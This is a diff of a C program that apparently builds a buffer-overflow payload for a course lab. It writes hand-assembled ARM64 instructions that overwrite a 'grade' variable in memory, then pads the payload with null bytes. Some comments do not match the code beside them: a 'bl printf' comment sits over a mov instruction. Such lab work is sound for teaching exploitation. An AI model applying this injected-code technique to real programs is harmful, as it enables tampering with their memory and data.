@@ -33,20 +33,16 @@ int main(void){
    ulInstruction = MiniAssembler_mov(0, 65);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
-   /* adr x1, grade */
-   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 4);
-   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
-
-   /* strb wo, [x1] */
-   ulInstruction = MiniAssembler_strb(0, 1);
+   /* bl printf     */
+   ulInstruction = MiniAssembler_mov(0, 65);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* mov w0, '+'   */
    ulInstruction = MiniAssembler_mov(0, 43);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
-   /* adr x1, grade + 1 */
-   ulInstruction = MiniAssembler_adr(1, 0x420045, pAAttack + 16);
+   /* adr x1, grade */
+   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 4);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* strb wo, [x1] */
@@ -59,7 +55,7 @@ int main(void){
 
 
    /* Writes the null byte at the end of the instructions */
-   for (i = 0; i < 12; i++)
+   for (i = 0; i < 16; i++)
       putc(0x00, psFile); /* Writes '00000000' */
 
    
